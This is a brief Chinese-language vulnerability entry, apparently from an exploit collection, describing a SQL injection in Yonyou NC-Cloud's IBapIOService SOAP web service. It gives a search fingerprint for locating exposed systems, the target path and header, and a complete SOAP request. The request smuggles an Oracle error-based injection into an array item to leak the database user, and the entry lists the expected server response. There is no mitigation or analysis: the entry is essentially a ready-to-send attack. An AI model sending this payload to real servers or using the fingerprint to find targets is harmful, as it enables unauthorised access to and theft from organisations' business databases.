# 用友NC-CloudIBapIOService存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1`
- **关键头**：`Content-Type: text/xml`

**请求体 / payload**
```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
<soapenv:Header/>
<soapenv:Body>
<gs:getBapTableDatas>
<gs:stringarrayItem>
DWQueue@MessageQueue' AND 1=UTL_INADDR.GET_HOST_ADDRESS('~'(user)'~')-- abc
</gs:stringarrayItem>
</gs:getBapTableDatas>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：500　|　—